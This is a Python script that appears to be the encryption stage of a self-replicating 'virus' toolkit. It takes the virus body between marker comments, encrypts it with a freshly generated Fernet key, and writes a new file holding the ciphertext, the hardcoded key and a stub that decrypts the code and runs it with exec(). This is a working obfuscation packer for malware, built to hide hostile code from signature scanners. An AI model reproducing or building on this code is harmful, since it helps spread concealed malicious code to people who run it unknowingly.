import cryptography
from cryptography.fernet import Fernet

payload = []
encode = []
secret_key = b''
previous_payload = []
file_name = ""

def ask_for_filename():
  global file_name
  print("Name of the file you want to encrypt the decryption method: ")
  file_name = input()


def read_payload():
  with open(file_name, 'r') as virus:
    actual_payload = False
    for line in virus:
      if actual_payload:
        if line == "###### END VIRUS ######\n":
          break
        payload.append(line)
      if "##### END ENCRYPT #####\n" == line:
        actual_payload = True


def read_encrypted_payload():
  with open(file_name, 'r') as virus:
    actual_payload = False
    for line in virus:
      if actual_payload:
        if line == "##### END ENCRYPT #####\n":
          break
        previous_payload.append(line)
      if "##### ENCRYPT #####\n" == line:
        actual_payload = True


def generate_key():
  global secret_key
  secret_key = Fernet.generate_key()


def encrypt_payload():
  fernet = Fernet(secret_key)
  for elem in payload:
    encode.append(fernet.encrypt(elem.encode()))


def ask_for_encrypted_filename():
  print("Name of the file with the encrypted virus: ")
  encypted_virus_filename = input()
  return encypted_virus_filename


def compute_payloads():
  read_payload()
  generate_key()
  read_encrypted_payload()
  encrypt_payload()


def write_virus(encrypted_virus_name):
  with open(encrypted_virus_name, "w") as virus:
    virus.write("##### START VIRUS #####\n")
    virus.write('\n##### ENCRYPT #####\n')
    virus.writelines(previous_payload)
    virus.write("decryption_encrypted_" + file_name[:-3] +" = [b'" + (b"',b'".join(encode)).decode() + "']")
    virus.write("\n##### END ENCRYPT #####\n")
    decryption = """
from cryptography.fernet import Fernet

decrypted_payload = []

def decrypt_payload():
  fernet = Fernet(b'""" + secret_key.decode() + """')
  for elem in decryption_encrypted_""" + file_name[:-3] + """:
    decrypted_payload.append((fernet.decrypt(elem)).decode())

decrypt_payload()
exec("".join(decrypted_payload))
"""
    virus.write(decryption)
    virus.write("\n###### END VIRUS ######\n")


if __name__ == '__main__':
  ask_for_filename()
  compute_payloads()
  write_virus(ask_for_encrypted_filename())